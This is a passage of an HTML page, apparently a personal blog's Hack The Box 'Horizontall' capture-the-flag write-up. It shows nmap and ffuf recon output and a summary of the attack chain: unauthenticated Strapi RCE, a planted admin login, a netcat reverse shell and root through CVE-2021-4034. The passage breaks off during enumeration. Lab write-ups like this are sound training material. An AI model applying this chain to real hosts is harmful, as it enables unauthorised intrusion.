@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>HTB Horizontall Writeup - Yash hacks stuff</title><meta name="Description" content=""><meta property="og:title" content="HTB Horizontall Writeup" />
+<meta property="og:description" content="Horizontall   Process   Carried out an nmap scan found two ports open
+ 22/tcp open ssh 80/tcp open http    The ssh version was not vulnerable.
+  The webpage at horizontal.htb was static and no actionable/useful OSINT was present
+  Directory enumeration carried out using two wordlists
+ dirb/common.txt dirbuster/subdirectory-list-2.3-medium.txt No interesting subdirectories.    Subsequently vhost enumeration was carried out." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yashtyagi-cjg.github.io/hacksstuff/firstpost/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-02-04T22:14:31+05:30" />
+<meta property="article:modified_time" content="2022-02-04T22:14:31+05:30" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB Horizontall Writeup"/>
+<meta name="twitter:description" content="Horizontall   Process   Carried out an nmap scan found two ports open
+ 22/tcp open ssh 80/tcp open http    The ssh version was not vulnerable.
+  The webpage at horizontal.htb was static and no actionable/useful OSINT was present
+  Directory enumeration carried out using two wordlists
+ dirb/common.txt dirbuster/subdirectory-list-2.3-medium.txt No interesting subdirectories.    Subsequently vhost enumeration was carried out."/>
+<meta name="application-name" content="Yash Tyagi">
+<meta name="apple-mobile-web-app-title" content="Yash Tyagi"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://yashtyagi-cjg.github.io/hacksstuff/firstpost/" /><link rel="stylesheet" href="/hacksstuff/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/hacksstuff/css/style.min.css"><link rel="stylesheet" href="/hacksstuff/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/hacksstuff/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HTB Horizontall Writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yashtyagi-cjg.github.io\/hacksstuff\/firstpost\/"
+        },"genre": "posts","keywords": "Easy, Linux, Retired","wordcount":  1255 ,
+        "url": "https:\/\/yashtyagi-cjg.github.io\/hacksstuff\/firstpost\/","datePublished": "2022-02-04T22:14:31+05:30","dateModified": "2022-02-04T22:14:31+05:30","publisher": {
+            "@type": "Organization",
+            "name": "Yash"},"author": {
+                "@type": "Person",
+                "name": "Yash"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : '' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/hacksstuff/" title="Yash hacks stuff"><span class="header-title-pre"><i class= far fa-fw'></i></span>Yash hacks stuff</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/hacksstuff/hacksstuff/posts/"> HTB Writeups </a><a class="menu-item" href="/hacksstuff/hacksstuff/tags/"> Tags </a><a class="menu-item" href="/hacksstuff/hacksstuff/categories/"> Categories </a><a class="menu-item" href="/hacksstuff/hacksstuff/about/"> About </a><a class="menu-item" href="https://github.com/yashtyagi-cjg" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/hacksstuff/" title="Yash hacks stuff"><span class="header-title-pre"><i class= far fa-fw'></i></span>Yash hacks stuff</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/hacksstuff/hacksstuff/posts/" title="">HTB Writeups</a><a class="menu-item" href="/hacksstuff/hacksstuff/tags/" title="">Tags</a><a class="menu-item" href="/hacksstuff/hacksstuff/categories/" title="">Categories</a><a class="menu-item" href="/hacksstuff/hacksstuff/about/" title="">About</a><a class="menu-item" href="https://github.com/yashtyagi-cjg" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">HTB Horizontall Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/hacksstuff/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Yash</a></span>&nbsp;<span class="post-category">included in <a href="/hacksstuff/categories/linux-easy/"><i class="far fa-folder fa-fw"></i>Linux Easy</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-02-04">2022-02-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1255 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-enumeration">1. Enumeration</a>
+      <ul>
+        <li><a href="#11-nmap">1.1 Nmap</a></li>
+        <li><a href="#12-directory-enumeration">1.2 Directory Enumeration</a></li>
+        <li><a href="#13-vhost-enumeration">1.3 Vhost Enumeration</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-httphorizonalhtb">2. http://horizonal.htb</a></li>
+    <li><a href="#3-api-prod-horizontallhtb">3. api.-prod.-horizontall.htb</a>
+      <ul>
+        <li><a href="#31-homepage">3.1 Homepage</a></li>
+        <li><a href="#32-directory-enumeration">3.2 Directory Enumeration</a></li>
+        <li><a href="#33-login-portal">3.3 Login portal</a></li>
+        <li><a href="#34-vulnerability">3.4 Vulnerability</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-foothold">4. Foothold</a>
+      <ul>
+        <li><a href="#41-shell">4.1 Shell</a></li>
+        <li><a href="#42-reverse-shell">4.2 Reverse Shell</a></li>
+        <li><a href="#43-user-flag">4.3 User Flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-privilege-escalation">5. Privilege Escalation</a></li>
+    <li><a href="#51-exploit">5.1 Exploit</a></li>
+    <li><a href="#52-root-flag">5.2 Root Flag</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><figure><img src="/images/horizontall.jpeg"/><figcaption>
+            <h4>Horizontall</h4>
+        </figcaption>
+</figure>
+
+<h1 id="process">Process</h1>
+<ul>
+<li>
+<p>Carried out an nmap scan found two ports open</p>
+<ul>
+<li>22/tcp open ssh</li>
+<li>80/tcp open http</li>
+</ul>
+</li>
+<li>
+<p>The ssh version was not vulnerable.</p>
+</li>
+<li>
+<p>The webpage at horizontal.htb was static and no actionable/useful OSINT was present</p>
+</li>
+<li>
+<p>Directory enumeration carried out using two wordlists</p>
+<ul>
+<li>dirb/common.txt</li>
+<li>dirbuster/subdirectory-list-2.3-medium.txt</li>
+<li>No interesting subdirectories.</li>
+</ul>
+</li>
+<li>
+<p>Subsequently vhost enumeration was carried out.</p>
+<ul>
+<li>~<em>api-prod</em>~ subdomain found.</li>
+<li>Directory enumeration again carried out. Directories found:
+<ul>
+<li>admin</li>
+<li>reviews</li>
+<li>users</li>
+<li>connect</li>
+<li>etc</li>
+</ul>
+</li>
+<li>index.html was again a static webpage. The /admin subdirectory was intresting.</li>
+<li>It had a strapi pannel. The strapi application is vulnerable to unauthenticated RCE</li>
+<li>Using the exploit. An admin account was created
+<ul>
+<li>credentials admin:SuperSecretPasssword1</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>The exploit also gave access to console for RCE. The consle did not return any ouput for the commands to verify the commands were being executed. I tested out for <strong>Blind RCE</strong>.</p>
+</li>
+<li>
+<p>Started a python webserver on my machine. Sent a GET Request using the console to my webserver. It confirmed existence of Blind RCE.</p>
+</li>
+<li>
+<p>I levereaged the console to get a reverse netcat shell</p>
+</li>
+<li>
+<p>Subsequently stablized the shell and read the user flag</p>
+</li>
+<li>
+<p>Privilege Escalation</p>
+<ul>
+<li>Used the LinPeas.sh to enumerate the system found it vulnerable to CVE-2021-4034.</li>
+<li>Found an <a href="https://github.com/arthepsy/CVE-2021-4034.git" target="_blank" rel="noopener noreffer">exploit</a></li>
+<li>Executed it and escalated to root.</li>
+<li>Et voila read the root.txt.</li>
+</ul>
+</li>
+</ul>
+<h2 id="1-enumeration">1. Enumeration</h2>
+<h3 id="11-nmap">1.1 Nmap</h3>
+<ul>
+<li>80/tcp open  http    nginx 1.14.0 (Ubuntu)</li>
+<li>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</li>
+<li>No UDP port open</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo nmap -sC -A -Pn 10.129.161.165 -T4 -oN nmap.ad
+</span></span><span class="line"><span class="cl">Host discovery disabled <span class="o">(</span>-Pn<span class="o">)</span>. All addresses will be marked <span class="s1">&#39;up&#39;</span> and scan <span class="nb">times</span> will be slower.
+</span></span><span class="line"><span class="cl">Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-02-03 23:44 IST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> horizontall.htb <span class="o">(</span>10.129.161.165<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.19s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed ports
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.14.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: horizontall
+</span></span><span class="line"><span class="cl">No exact OS matches <span class="k">for</span> host <span class="o">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span class="o">)</span>.
+</span></span><span class="line"><span class="cl">TCP/IP fingerprint:
+</span></span><span class="line"><span class="cl">OS:SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.91%E<span class="o">=</span>4%D<span class="o">=</span>2/3%OT<span class="o">=</span>22%CT<span class="o">=</span>1%CU<span class="o">=</span>40479%PV<span class="o">=</span>Y%DS<span class="o">=</span>2%DC<span class="o">=</span>T%G<span class="o">=</span>Y%TM<span class="o">=</span>61FC1B9A
+</span></span><span class="line"><span class="cl">OS:%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>103%GCD<span class="o">=</span>1%ISR<span class="o">=</span>108%TI<span class="o">=</span>Z%CI<span class="o">=</span>Z%II<span class="o">=</span>I%TS<span class="o">=</span>A<span class="o">)</span>OPS<span class="o">(</span>
+</span></span><span class="line"><span class="cl">OS:O1<span class="o">=</span>M505ST11NW7%O2<span class="o">=</span>M505ST11NW7%O3<span class="o">=</span>M505NNT11NW7%O4<span class="o">=</span>M505ST11NW7%O5<span class="o">=</span>M505ST11
+</span></span><span class="line"><span class="cl">OS:NW7%O6<span class="o">=</span>M505ST11<span class="o">)</span>WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>FE88%W2<span class="o">=</span>FE88%W3<span class="o">=</span>FE88%W4<span class="o">=</span>FE88%W5<span class="o">=</span>FE88%W6<span class="o">=</span>FE88<span class="o">)</span>ECN<span class="o">(</span>
+</span></span><span class="line"><span class="cl">OS:R<span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>FAF0%O<span class="o">=</span>M505NNSNW7%CC<span class="o">=</span>Y%Q<span class="o">=)</span>T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>AS
+</span></span><span class="line"><span class="cl">OS:%RD<span class="o">=</span>0%Q<span class="o">=)</span>T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>
+</span></span><span class="line"><span class="cl">OS:Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>
+</span></span><span class="line"><span class="cl">OS:R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%T<span class="o">=</span>40%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%R
+</span></span><span class="line"><span class="cl">OS:UCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T<span class="o">=</span>40%CD<span class="o">=</span>S<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Network Distance: <span class="m">2</span> hops
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">TRACEROUTE <span class="o">(</span>using port 111/tcp<span class="o">)</span>
+</span></span><span class="line"><span class="cl">HOP RTT       ADDRESS
+</span></span><span class="line"><span class="cl"><span class="m">1</span>   197.81 ms 10.10.14.1
+</span></span><span class="line"><span class="cl"><span class="m">2</span>   201.86 ms horizontall.htb <span class="o">(</span>10.129.161.165<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 37.66 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="12-directory-enumeration">1.2 Directory Enumeration</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -u http://horizontall.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -c -of ffuf/horz.common.md
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
+</span></span><span class="line"><span class="cl">       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
+</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
+</span></span><span class="line"><span class="cl">        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
+</span></span><span class="line"><span class="cl">          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       v1.3.1 Kali Exclusive &lt;<span class="m">3</span>
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> :: Method           : GET
+</span></span><span class="line"><span class="cl"> :: URL              : http://horizontall.htb/FUZZ
+</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
+</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                        <span class="o">[</span>Status: 200, Size: 901, Words: 43, Lines: 2<span class="o">]</span>
+</span></span><span class="line"><span class="cl">css                     <span class="o">[</span>Status: 301, Size: 194, Words: 7, Lines: 8<span class="o">]</span>
+</span></span><span class="line"><span class="cl">favicon.ico             <span class="o">[</span>Status: 200, Size: 4286, Words: 8, Lines: 1<span class="o">]</span>
+</span></span><span class="line"><span class="cl">img                     <span class="o">[</span>Status: 301, Size: 194, Words: 7, Lines: 8<span class="o">]</span>
+</span></span><span class="line"><span class="cl">index.html              <span class="o">[</span>Status: 200, Size: 901, Words: 43, Lines: 2<span class="o">]</span>
+</span></span><span class="line"><span class="cl">js                      <span class="o">[</span>Status: 301, Size: 194, Words: 7, Lines: 8<span class="o">]</span>
+</span></span><span class="line"><span class="cl">:: Progress: <span class="o">[</span>4614/4614<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">262</span> req/sec :: Duration: <span class="o">[</span>0:00:21<span class="o">]</span> :: Errors: <span class="m">0</span> :
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="13-vhost-enumeration">1.3 Vhost Enumeration</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -u http://horizontall.htb -H <span class="s2">&#34;Host: FUZZ.horizontall.htb&#34;</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -of md -o vhost.horz -fs <span class="m">194</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
+</span></span><span class="line"><span class="cl">       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
+</span></span><span class="line"><span class="cl">       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
+</span></span><span class="line"><span class="cl">        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
+</span></span><span class="line"><span class="cl">         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
+</span></span><span class="line"><span class="cl">          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       v1.3.1 Kali Exclusive &lt;<span class="m">3</span>
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> :: Method           : GET
+</span></span><span class="line"><span class="cl"> :: URL              : http://horizontall.htb
+</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+</span></span><span class="line"><span class="cl"> :: Header           : Host: FUZZ.horizontall.htb
+</span></span><span class="line"><span class="cl"> :: Output file      : vhost.horz
+</span></span><span class="line"><span class="cl"> :: File format      : md
+</span></span><span class="line"><span class="cl"> :: Follow redirects : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Calibration      : <span class="nb">false</span>
+</span></span><span class="line"><span class="cl"> :: Timeout          : <span class="m">10</span>
+</span></span><span class="line"><span class="cl"> :: Threads          : <span class="m">40</span>
+</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+</span></span><span class="line"><span class="cl"> :: Filter           : Response size: <span class="m">194</span>
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">www                     <span class="o">[</span>Status: 200, Size: 901, Words: 43, Lines: 2<span class="o">]</span>
+</span></span><span class="line"><span class="cl">api-prod                <span class="o">[</span>Status: 200, Size: 413, Words: 76, Lines: 20<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="2-httphorizonalhtb">2. http://horizonal.htb</h2>
+<figure><img src="/images/horizontall-homepage.png"/><figcaption>
+            <h4>Homepage</h4>
+        </figcaption>
+</figure>
+
+<ul>
+<li>Static website</li>
+<li>No actionable or useful OSINT</li>
+</ul>
+<h2 id="3-api-prod-horizontallhtb">3. api.-prod.-horizontall.htb</h2>
+<h3 id="31-homepage">3.1 Homepage</h3>
+<p>![[Pasted image 20220204003329.png]]</p>
+<h3 id="32-directory-enumeration">3.2 Directory Enumeration</h3>
+<ul>
+<li>admin, ADMIN, Admin</li>
+<li>users</li>
+<li>connect</li>
+<li>robots.txt</li>
+<li>index.html</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
